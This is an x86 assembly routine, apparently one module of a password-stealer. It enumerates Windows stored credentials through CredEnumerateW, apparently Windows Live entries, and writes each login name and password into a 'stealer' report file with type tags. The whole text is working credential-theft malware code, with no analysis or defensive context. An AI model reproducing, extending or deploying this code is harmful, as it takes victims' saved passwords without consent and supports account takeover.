.data?
      buf1    db    200h dup (?)
      buf2    db    200h dup (?)
     
.code
GetLivePwd   proc
      LOCAL   WTF:DWORD
      LOCAL   count:DWORD
      LOCAL   credb:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], LIVE_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetLivePwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
     lea     eax, credb
     push    eax
     lea     eax, count
     push    eax
     push    0
     push    offset mask1
     call    dword ptr [_CredEnumerateW]
     cmp     dword ptr [count], 0
     je      no_cred
     
     xor     esi, esi
     mov     ecx, dword ptr [count]
cred_enum_lp:
     push    ecx
     push    esi
     mov     eax, dword ptr [credb]
     mov     eax, dword ptr [eax+esi*4]
     push    eax
     mov     eax, dword ptr [eax+1Ch]
     lstrcpyW, addr buf1, eax
     pop     eax
     mov     eax, dword ptr [eax+30h]
     lstrcpyW, addr buf2, eax
     lstrlenW, addr buf2
     imul    eax, eax, 2
     mov     dword ptr [plen], eax
     add     dword ptr [DataSize], sizeof plen
     add     dword ptr [DataSize], eax
     WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
     mov     byte ptr [data_type], REPORT_DATA_LOGIN
     add     dword ptr [DataSize], sizeof data_type
     WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
     WriteFile, stfile, addr buf2, plen, addr SNW, NULL
     lstrlenW, addr buf1
     imul    eax, eax, 2
     mov     dword ptr [plen], eax
     add     dword ptr [DataSize], sizeof plen
     add     dword ptr [DataSize], eax
     WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
     mov     byte ptr [data_type], REPORT_DATA_PWD
     add     dword ptr [DataSize], sizeof data_type
     WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
     WriteFile, stfile, addr buf1, plen, addr SNW, NULL
     pop     esi
     pop     ecx
     inc     esi
     dec     ecx
     jnz     cred_enum_lp
     
     push    dword ptr [credb]
     call    dword ptr [_CredFree]
no_cred:
      
    GetLivePwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetLivePwd   endp
